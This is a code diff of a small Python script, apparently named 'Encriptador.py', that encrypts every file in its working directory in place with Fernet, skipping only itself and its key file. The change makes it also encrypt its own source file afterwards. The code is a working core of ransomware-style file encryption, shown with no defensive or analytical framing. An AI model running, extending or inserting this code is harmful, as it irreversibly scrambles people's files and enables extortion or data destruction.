@@ -1,6 +1,6 @@
 import os
 from cryptography.fernet import Fernet
-
+script_name = os.path.basename(__file__)
 files=[]
 for file in os.listdir():
     if file=="Encriptador.py" or file=="thekey.key" or file=="Desencriptador.py":
@@ -21,9 +21,9 @@ for file in files:
     with open(file,"wb") as thefile:
         thefile.write(contents_encrypted)
         
-with open(Encriptador,"rb") as lastfile:
+with open(script_name,"rb") as lastfile:
     contents=lastfile.read()
 lastfile_encrypted=Fernet(key).encrypt(contents)
-with open(Encriptador,"wb") as lastfile:
+with open(script_name,"wb") as lastfile:
     lastfile.write(lastfile_encrypted)
 
